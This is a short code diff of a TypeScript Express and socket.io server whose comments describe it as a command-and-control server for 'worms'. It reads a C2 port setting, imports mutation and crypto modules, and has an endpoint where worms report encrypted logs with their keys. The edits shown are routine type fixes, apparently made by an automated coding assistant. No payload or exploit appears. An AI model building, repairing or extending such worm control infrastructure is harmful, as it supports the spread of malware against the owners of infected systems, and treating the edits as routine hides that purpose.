@@ -1,15 +1,13 @@
-// Fix: Changed import to only use the default export of express.
-// This allows using qualified types like `express.Request` to avoid conflicts with global DOM types.
-import express from 'express';
+// Fix: Use a standard ES module import for Express and explicitly import Request and Response types
+// to avoid conflicts with global DOM types.
+import express, { Request, Response } from 'express';
 import { createServer } from 'http';
 import { Server } from 'socket.io';
 import { logger } from './utils/logger';
 import { encrypt, decrypt } from './modules/crypto';
 import { MUTATIONS } from './modules/mutations';
 
-// Fix: Explicitly type `app` with the qualified `express.Express` type.
-// This resolves overload errors on `app.use` by removing type ambiguity.
-const app: express.Express = express();
+const app = express();
 const httpServer = createServer(app);
 const io = new Server(httpServer, {
     cors: {
@@ -17,14 +15,16 @@ const io = new Server(httpServer, {
     }
 });
 
-const PORT = 4000;
+const PORT = process.env.C2_PORT || 4000;
 
+// Fix: Correctly typing `app` by using the right import syntax for Express
+// resolves overload errors on `app.use`.
 app.use(express.json());
 
 // Endpoint for worms to report failures
-// Fix: Explicitly type handler parameters with qualified `express.Request` and `express.Response` types.
-// This resolves errors where properties like `.body` or methods like `.status()` were not found due to type conflicts.
-app.post('/api/report', (req: express.Request, res: express.Response) => {
+// Fix: Explicitly typing `req` and `res` with Express's types resolves
+// errors like "property 'body' does not exist" and "property 'status' does not exist".
+app.post('/api/report', (req: Request, res: Response) => {
     // Worms must provide their instance ID, encrypted log, and the key used for encryption.
     const { instanceId, payload, key } = req.body;
     
